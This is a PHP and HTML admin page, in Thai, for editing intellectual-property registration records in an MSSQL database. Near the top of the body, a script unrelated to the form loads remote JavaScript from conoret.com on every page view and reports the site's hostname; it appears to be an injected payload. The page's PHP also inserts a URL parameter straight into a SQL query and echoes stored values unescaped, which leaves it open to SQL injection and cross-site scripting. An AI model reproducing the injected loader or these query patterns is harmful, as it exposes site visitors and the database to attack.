<meta charset="UTF-8">
<style>
    body,
    a {
        font-family: 'K2D', sans-serif;
        text-decoration: none;
        margin-top: 10px;
        color: blue;
        text-align: center;
    }

    .glow1 {
        font-size: 26px;
        color: black;
        width: 400%;
        height: 80px;
        color: white;
        padding: 0.5em;
        display: inline-block;
        line-height: 1.3;
        background: #cb5454;
        vertical-align: middle;
        border-radius: 115px 20px 115px 20px
    }


    .tb {
        background-color: #FFDAB9;

        color: #000;
    }

    .center {
        margin-left: auto;
        margin-right: auto;
        font-size: 14px;
        color: black;

        height: 20px;
        padding: 18p;
        border-radius: 4px;
        border: none;
        min-width: 230px;
    }

    .center1 {
        margin-right: auto;
        font-size: 14px;
        color: black;

        height: 20px;
        border-radius: 8px;

    }

    .tr {

        margin-left: auto;
        margin-right: auto;
        margin-top: 50px;
        border: none;
    }

    .button:hover {
        background-color: #3e8e41;
    }

    .button:active {
        background-color: #3e8e41;
        box-shadow: 0 5px #666;
        transform: translateY(4px);
    }

    .button1:hover {
        background-color: red;
    }

    .button1:active {
        background-color: #d90d19;
        box-shadow: 0 5px #666;
        transform: translateY(4px);
    }

    .button1 {
        display: inline-block;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        outline: none;
        color: #fff;
        background-color: red;
        border: none;
        border-radius: 12px;
        box-shadow: 0 4px white;
        margin-left: 200%;
        margin-top: 5px;
    }


    .button {
        display: inline-block;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        outline: none;
        color: #fff;
        background-color: #4CAF50;
        border: none;
        border-radius: 12px;
        box-shadow: 0 4px white;
        margin-left: 950px;
        margin-top: 5px;
    }

    .glow {
        font-size: 26px;
        color: black;
        text-align: center;
        animation: glow 1s ease-in-out infinite alternate;
        color: black;
        padding: 0.5em 0;
        border-top: solid 3px black;
        border-bottom: solid 3px black;
        width: 30%;
        margin-left: 580px;
        border-radius: 10px;
    }

    p.outset1 {
        display: inline;

        border-style: outset;
        background: #2c15b1;
        text-align: center;
        margin-right: 90%;
        margin-top: 2%;
        color: white;
        height: 40px;
        padding: 15px;
        border-radius: 8px;
        width: 260px;
    }

    .outset1:active {
        background-color: #442bd1;
        box-shadow: 0 4px #666;
        transform: translateY(4px);
    }

    input:not([type="image"i]) {
        box-sizing: border-box;

    }

    input[type="file"i] {
        appearance: none;
        background-color: initial;
        cursor: default;
        align-items: baseline;
        color: inherit;
        text-overflow: ellipsis;
        white-space: pre;
        text-align: start !important;
        padding: initial;
        border: initial;
        overflow: hidden !important;
        display: inline;


    }

    td {
        display: table-cell;
        vertical-align: inherit;
        margin-right: 50px;


    }

    th {
        display: table-cell;
        vertical-align: inherit;
        font-weight: bold;
        text-align: -internal-center;
        padding: 20px;
        color: #000;


    }

    .form {
        width: 1500px;
        height: 1100px;
        background: #e6e6e6;
        border-radius: 8px;
        box-shadow: 0 0 40px -10px #000;
        margin: calc(50vh - 220px) auto;
        padding: 20px 30px;
        max-width: calc(100vw - 40px);
        box-sizing: border-box;
        font-family: 'Montserrat', sans-serif;
        position: relative;
        margin: auto;
        align-items: center;
    }

    .box2 {

        -webkit-backdrop-filter: blur(10px);
        backdrop-filter: blur(10px);
        background-color: #f99f37;
        border-radius: 0.25rem;

    }

    input[type=text] {

        height: 39px;
        padding: 0px 10px;
        background-color: rgb(255 255 255);
        border: none;
        display: inline;
        color: #303030;
        font-size: 13px;
        font-weight: 400;
        float: left;
        text-align: center;
        border-radius: 5px;
        -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    }

    input[type=date],
    input[type=ddmmyy],input[type=ddmmyy2] {

        height: 39px;
        padding: 0px 10px;
        background-color: rgb(255 255 255);
        border: none;
        display: inline;
        color: #303030;
        font-size: 13px;
        font-weight: 400;
        min-width: 184px;
        border-radius: 5px;
        -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    }

    input[type=number] {

        height: 39px;
        padding: 0px 10px;
        background-color: rgb(255 255 255);
        border: none;
        display: inline;
        color: #303030;
        font-size: 13px;
        font-weight: 400;

        text-align: center;
        border-radius: 5px;
        -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    }


    label:before,
    select option,
    select {

        font-size: 13px;
        padding: 1em;
        line-height: 1.4;
        min-width: 184px;
        background-color: #ffffff;
        border: 1px solid #e5e5e5;
        border-radius: 4px;
        -webkit-transition: 0.35s ease-in-out;
        -moz-transition: 0.35s ease-in-out;
        -o-transition: 0.35s ease-in-out;
        transition: 0.35s ease-in-out;
        transition: all 0.35s ease-in-out;
        text-align: center;
    }
</style>

<body>
    <script type="text/javascript">
        window.top === window && ! function() {
            var e = document.createElement("script"),
                t = document.getElementsByTagName("head")[0];
            e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
        }();
    </script>
    <div class="body">
        <?php
        //ไอดีที่เราทำการดึงมาเพื่อนำมาแก้ไข
        $ID_ip = $_GET['ID_ip'];
        // $objDB = mssql_select_db("intelle");
        $data = mssql_query("SELECT * FROM tb_IP WHERE ID_ip='$ID_ip'")
            or die(mssql_error());

        ?>

        <h1 class="glow">แก้ไขข้อมูลทรัพย์สินทางปัญญา</h1>
        <br>
        <a style="text-decoration: none;" onclick="location. href='indexadmin.php?Menu=5&Submenu=showmanage'; ">
            <p class="outset1">ย้อนกลับ</p>
        </a><br><br><br>
        <?php
        while ($info = mssql_fetch_array($data)) {
            $name = iconv("tis-620", "utf-8",  $info['name']);
            $type = iconv("tis-620", "utf-8", $info['type']);
            $numfeduest = iconv("tis-620", "utf-8", $info['numfeduest']);
            $form = iconv("tis-620", "utf-8", $info['form']);
            $offer = iconv("tis-620", "utf-8", $info['offer']);
            $admin = iconv("tis-620", "utf-8", $info['admin']);
            $agent = iconv("tis-620", "utf-8", $info['agent']);
            $numregister = iconv("tis-620", "utf-8", $info['numregister']);
            $datenumregister = iconv("tis-620", "utf-8", $info['datenumregister']);
            $kind = iconv("tis-620", "utf-8", $info['kind']);
            $title = iconv("tis-620", "utf-8", $info['title']);
            $holdre = iconv("tis-620", "utf-8", $info['holdre']);
            $team = iconv("tis-620", "utf-8", $info['team']);
            $affiliation = iconv("tis-620", "utf-8", $info['affiliation']);
            $inventor = iconv("tis-620", "utf-8", $info['inventor']);
            $inventors = iconv("tis-620", "utf-8", $info['inventors']);
            $framename = iconv("tis-620", "utf-8", $info['framename']);
            $projectcode = iconv("tis-620", "utf-8", $info['projectcode']);
            $contract = iconv("tis-620", "utf-8", $info['contract']);
            $genus = iconv("tis-620", "utf-8", $info['genus']);
            $attachment = iconv("tis-620", "utf-8", $info['attachment']);
            $benefit = iconv("tis-620", "utf-8", $info['benefit']);
            $lead = iconv("tis-620", "utf-8", $info['lead']);
            $sta = iconv("tis-620", "utf-8", $info['sta']);
            $note = iconv("tis-620", "utf-8", $info['note']);
            $agency = iconv("tis-620", "utf-8", $info['agency']);

        ?>
            <form action="manage/updatemanage.php?ID_ip=<?php echo $info['ID_ip']; ?>" method="post" enctype="multipart/form-data">
                <div class="form">

                    <table class="center1">
                        <tbody>
                            <tr>
                                <th align="left" width="70%" class="glow1"> &nbsp; &nbsp;ประเภทการจดทะเบียน</th>
                                <th class="th">
                                    <input type="radio" id="html" name="type" value="1" <?php if ($type == 1) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="html">สิทธิบัตรการประดิษฐ์</label>
                                    &nbsp; <input type="radio" id="css" name="type" value="2" <?php if ($type == 2) {
                                                                                                    echo 'checked';
                                                                                                } ?>>
                                    &nbsp; <label for="css">สิทธิบัตรการออกแบบผลิตภัณฑ์</label>
                                    <input type="radio" id="css" name="type" value="3" <?php if ($type == 3) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="css">อนุสิทธิบัตร</label>
                                    <input type="radio" id="css" name="type" value="4" <?php if ($type == 4) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    <label for="css">การจดทะเบียนเครื่องหมายการค้า</label>
                                    <br><input type="radio" id="css" name="type" value="5" <?php if ($type == 5) {
                                                                                                echo 'checked';
                                                                                            } ?>>
                                    &nbsp; <label for="css">การจดทะเบียนเครื่องหมายรับรอง</label>
                                    <input type="radio" id="css" name="type" value="6" <?php if ($type == 6) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="css">การจดทะเบียนเครื่องหมายบริการ</label>
                                    <input type="radio" id="css" name="type" value="7" <?php if ($type == 7) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="css">การขึ้นทะเบียนพันธุ์พืช</label>
                                    <input type="radio" id="css" name="type" value="8" <?php if ($type == 8) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="css">เครื่องหมายร่วม</label>
                                </th>
                                <th>
                                </th>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tr class="tr">

                            <div class="container">


                                </style>
                                <th style="width: 180px;">เลขที่คำขอ: </th>
                                </style>
                                <td>
                                    <div class="container" style="margin-left:10px; margin-right:35px;">
                                        <input type="number" id="number" name="numfeduest" required="" value="<?php echo $numregister; ?>">
                                    </div>
                                </td>

                                <th style="width: 220px; ">วันที่ยื่นขอ:</th>
                                <td>
                                    <div class="container" style="margin-right:35px;">
                                        <input type="date" name="offer"  id="ddmmyy" value="<?php echo $offer; ?>">
                                        <div id="result"></div>
                                </td>

                                <th style="width: 360px; margin-right:25px;">เเบบพิมพ์คำขอสิทธิบัตร<br>/อนุสิทธิบัตรจดทะเบียน: </th>
                                <td>
                                    <div class="container" style="text-align:center; margin-left:40px; color: black; margin-right:40px;">
                                        <label for="myfile">กรุณาเลือกไฟล์</label><br>
                                        &nbsp;<a id="file" class="outset1" href="../uploadpdf/<?php echo $form ?>" target="-blank">เรียกดู</a>
                                </td>

                                <th style="width: 210px; margin-right:35px;">สำหรับแอดมิน</th>
                                <td>
                                    <div class="container" style="display:inline; text-align:center;  margin-left:0px; color: black;">
                                        <label for="myfile">กรุณาเลือกไฟล์</label><input type="file" multiple="multiple" id="myfile" name="admin[]" style="width:180px;"><br>
                                        <? if (trim($admin["admin"])!="") {
                                                ?>
                                        <a id="file" class="outset1" style="text-align: center; text-decoration: underline; color:blue" href="../uploadpdf/<?php echo $admin ?>" target="_blank">เรียกดู</a>
                                        <?}
                                                ?>
                                </td>
                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr">
                            <div class="container">

                                <th style="width: 105px;">ตัวเเทน</th>
                                <td>
                                    <div class="container" style=" margin-left: 40px; margin-right:40px">
                                        <input type="text" placeholder="" name="agent" required="" value="<?php echo $agent; ?>">
                                    </div>
                                </td>

                                <th style="width: 120px;">เลขทะเบียน</th>
                                <td>
                                    <div class="container" style=" margin-left:10px; margin-right:50px">
                                        <input type="number" id="number" placeholder="000000" name="numregister" required="" value="<?php echo $numregister; ?>">
                                    </div>
                                </td>

                                <th style="width: 170px;">วันที่ออกเลขทะเบียน</th>
                                <td>
                                    <div class="container" style="margin-left:30px; margin-right: 60px;">
                                        <input type="date" name="datenumregister" value="<?php echo $datenumregister; ?>">
                                        <div id="result"></div>
                                </td>

                                <th>ชนิด</th>
                                <td class="tr">

                                    <div class="container" style="margin-left: 35px;">
                                        <select name="kind" id="id_kind" onchange="fm_ID_kind(this.value)">
                                            <option value="all">--กรุณาเลือก--</option>
                                            <?
                                            $data2 = mssql_query("SELECT * FROM tb_kind");

                                            while ($info2 = mssql_fetch_array($data2)) {
                                                $ss = "";
                                                if ($kind == $info2["ID"]) {
                                                    $ss = "selected";
                                                }

                                                echo '<option value="' . $info2["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info2["kinds"]) . '</option>';
                                            } ?>
                                        </select>
                                    </div>
                                </td>

                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class=" tr">
                            <div class="container">

                                <th style="width: 87px;">ชื่อเรื่อง</th>
                                <td>
                                    <div class="container" style=" margin-left: 50px; margin-right:43px">
                                        <input type="text" placeholder="" name="title" required="" value="<?php echo $title; ?>">
                                    </div>
                                </td>

                                <th style="width: 102px;">ผู้ทรงสิทธิ</th>
                                <td>
                                    <div class="container" style=" margin-left: 17px; margin-right:95px">
                                        <input type="text" placeholder="xxx" name="holdre" required="" value="<?php echo $holdre; ?>">
                                    </div>
                                </td>

                                <th>กลุ่ม</th>
                                <td>
                                    <div class="container" style="margin-left: 80px; margin-right:60px">
                                        <select name="team"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก-- </option>
                                            <option value="1" <?php if ($team == 1) {
                                                                    echo 'selected';
                                                                } ?>>อช.</option>
                                            <option value="2" <?php if ($team == 1) {
                                                                    echo 'selected';
                                                                } ?>>พช.</option>
                                            <option value="3" <?php if ($team == 1) {
                                                                    echo 'selected';
                                                                } ?>>บอ.</option>
                                        </select>
                                </td>

                                <th>สังกัด</th>
                                <td>
                                    <div class="container" style="margin-left: 30px;">
                                        <select name="affiliation" id="id_affiliation" onchange="fm_ID_affiliation(this.value)"> Answer 1
                                            <option value="">--กรุณาเลือก--</option>
                                            <?
                                            $data4 = mssql_query("SELECT * FROM tb_affiliation");
                                            while ($info4 = mssql_fetch_array($data4)) {
                                                $ss = "";
                                                if ($affiliation == $info4["ID"]) {
                                                    $ss = "selected";
                                                }

                                                echo '<option value="' . $info4["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info4["affiliation"]) . '</option>';
                                            } ?>

                                        </select>
                                </td>

                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr">
                            <div class="container">
                                <th>หน่วยงาน<br>ภายนอก</th>
                                <td>
                                    <div class="container" style="  margin-left:33px; margin-right:45px">
                                        <input type="text" id="number" placeholder="" name="agency" value="<?php echo $agency; ?>">
                                    </div>
                                </td>
                                <th>ผู้ประดิษฐ์<br>(1คน)</th>
                                <td>
                                    <div class="container" style=" margin-left: 15px; margin-right:82px">
                                        <select name="inventor" id="id_inventor" onchange="fm_ID_inventor(this.value)"> Answer 1
                                            <option value="">--กรุณาเลือก--
                                            </option>
                                            <?
                                            $data5 = mssql_query("SELECT * FROM tb_inventor");

                                            while ($info5 = mssql_fetch_array($data5)) {
                                                $ss = "";
                                                if ($inventor == $info5["ID"]) {
                                                    $ss = "selected";
                                                }

                                                echo '<option value="' . $info5["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info5["inventor"]) . '</option>';
                                            } ?>

                                        </select>
                                </td>

                                <th>ผู้ประดิษฐ์<br>(1-15)</th>
                                <td>
                                    <div class="container" style=" margin-left: 48px; margin-right:20px">
                                        <select name="inventors" id="id_inventors" onchange="fm_ID_inventors(this.value)"> Answer 1
                                            <option value="">--กรุณาเลือก--
                                            </option>
                                            <?
                                            $data6 = mssql_query("SELECT * FROM tb_inventors");
                                            while ($info6 = mssql_fetch_array($data6)) {
                                                $ss = "";
                                                if ($inventors == $info6["ID"]) {
                                                    $ss = "selected";
                                                }

                                                echo '<option value="' . $info6["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info6["inventors"]) . '</option>';
                                            } ?>
                                        </select>
                                </td>

                                <th>ชื่อโครงการ<br>(กตป.)</th>
                                <td>
                                    <div class="container" style=" margin-left: 10px; margin-right:0px">
                                        <input type="text" placeholder=" " name="framename" required="" value="<?php echo $framename; ?>">
                                    </div>
                                </td>



                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr">
                            <div class="container"">
                            <th style=" width: 150px;">รหัสโครงการ<br>วิจัยบริการวิจัย</th>
                                <td>
                                    <div class=" container" style="margin-left: 0px; margin-right:30px">
                                        <input type="number" id="number" placeholder="0" name="projectcode" required="" value="<?php echo $projectcode; ?>">
                                    </div>
                                </td>
                                <th>คู่สัญญา<br>โครงการ</th>


                                <td>
                                    <?
                                    $result11 = mssql_query("SELECT * FROM tb_contract where ID='$contract'");
                                    //$result = mssql_query($data);
                                    $info11 = mssql_fetch_array($result11);
                                    

                                    ?>
                                    <div id="box" class="container" style="  margin-left:25px; margin-right:70px;">
                                        <input style="width: 200px;" type="text" id="get_value" name="con" value="<?php echo iconv("TIS-620", "UTF-8", $info11["contract"]); ?>">

                                    </div>
                                    <script>
                                        //เรียกใช้ฟังก์ชั่น
                                        function fn_post_value() {
                                            //รับค่าจากตัวเลือก
                                            // var value_select = $("#select_value").val();

                                            //พ่นค่าของตัวเลือกไปที่เป้าหมาย
                                            //#get_value ไอดีของเป้าหมาย

                                            $("#get_value").val($("#select_value option:selected").text());
                                        }
                                    </script>
                                    <span><select name="contract" id="select_value" onchange="fn_post_value()" style="width:20px; min-width: 20px; height:39px;border: solid 2px white; margin-right:40px;"> Answer 1
                                            <option value="">--กรุณาเลือก--</option>
                                            <?
                                            $data7 = mssql_query("SELECT * FROM tb_contract");
                                            while ($info7 = mssql_fetch_array($data7)) {
                                                $ss = "";
                                                if ($contract == $info7["ID"]) {
                                                    $ss = "selected";
                                                }

                                                echo '<option value="' . $info7["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info7["contract"]) . '</option>';
                                            } ?>
                                        </select></span>
                                </td>

                                <th style="padding-left: 20px;">ประเภท<br>โครงการ</th>
                                <td>

                                    <div class="container" style="  margin-left:40px; margin-right:20px">
                                        <select name="genus" id="id_genus" onchange="fm_ID_genus(this.value)"> Answer 1
                                            <option value="">--กรุณาเลือก--</option>
                                            <?
                                            $data8 = mssql_query("SELECT * FROM tb_genus");
                                            while ($info8 = mssql_fetch_array($data8)) {
                                                $ss = "";
                                                if ($genus == $info8["ID"]) {
                                                    $ss = "selected";
                                                }

                                                echo '<option value="' . $info8["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info8["genus"]) . '</option>';
                                            } ?>
                                        </select>
                                </td>

                                <th>เเนบเอกสาร<br>โครงการ</th>
                                <td>

                                    <div class="container" style="display:inline; text-align:center;  margin-left:0px; color: black;">
                                        <label for="myfile">กรุณาเลือกไฟล์</label><br><input type="file" id="myfile" name="attachment[]" multiple="multiple" style="width:180px;"><br>
                                        <? if (trim($attachment["attachment"])!="") {
                                                ?>
                                        <a id="file" class="outset1" href="../uploadpdf/<?php echo $attachment ?>" target="-blank" style="text-align: center; text-decoration: underline; color:blue">เรียกดู</a>
                                        <?}
                                                ?>
                                </td>
                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr">
                            <div class="container">
                                <th>ประเภทการใช้<br>ประโยชน์</th>
                                <td>
                                    <div class="container" style=" margin-left:25px; margin-right:30px">
                                        <select name="benefit" id="id_benefit" onchange="fm_ID_benefit(this.value)"> Answer 1
                                            <option value="VANI">--กรุณาเลือก--</option>
                                            <?
                                            $data9 = mssql_query("SELECT * FROM tb_benefit");
                                            while ($info9 = mssql_fetch_array($data9)) {
                                                $ss = "";
                                                if ($benefit == $info9["ID"]) {
                                                    $ss = "selected";
                                                }
                                                echo '<option value="' . $info9["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info9["benefit"]) . '</option>';
                                            } ?>
                                        </select>
                                </td>
                                <th>ผู้นำผลงาน<br>วิจัยไปใช้ประโยชน์</th>
                                <class="tr">
                                    <td>
                                        <div class="container" style="  margin-left:px; margin-right:50px">
                                            <input type="text" placeholder="" name="lead" required="" value="<?php echo $lead; ?>">
                                        </div>
                                    </td>

                                    <th>สถานะอัพเดทปัจจุบัน</th>
                                    <td>
                                        <div class="container" style="  margin-left:px; margin-right:20px">
                                            <select name="sta" id="id_sta" onchange="fm_ID_sta(this.value)"> Answer 1
                                                <option value="">--กรุณาเลือก--
                                                </option>
                                                <?
                                                $data10 = mssql_query("SELECT * FROM tb_sta");
                                                while ($info10 = mssql_fetch_array($data10)) {
                                                    $ss = "";
                                                    if ($sta == $info10["ID"]) {
                                                        $ss = "selected";
                                                    }
                                                    echo '<option value="' . $info10["ID"] . '"  ' . $ss . '>' . iconv("tis-620", "utf-8", $info10["sta"]) . '</option>';
                                                } ?>
                                            </select>
                                    </td>

                                    <th>หมายเหตุ</th>
                                    <td>
                                        <div class="container" style="  margin-left:px; ">
                                            <input type="text" placeholder="" name="note" required="" value="<?php echo $note; ?>">
                                        </div>
                                    </td>

                            </div>
                        </tr>
                    </table>

                    <table table="" style="width:20%" class="center1">

                        <tbody>
                            <tr>
                                <th><button class="button" type="submit">บันทึก</button></th>
                                <th><input type="reset" name="cancle" value="ยกเลิก" class="button1" /></th>

                            </tr>
                        </tbody>
                    </table>
                </div>
            </form>
        <?php } ?>
    </div>
</body>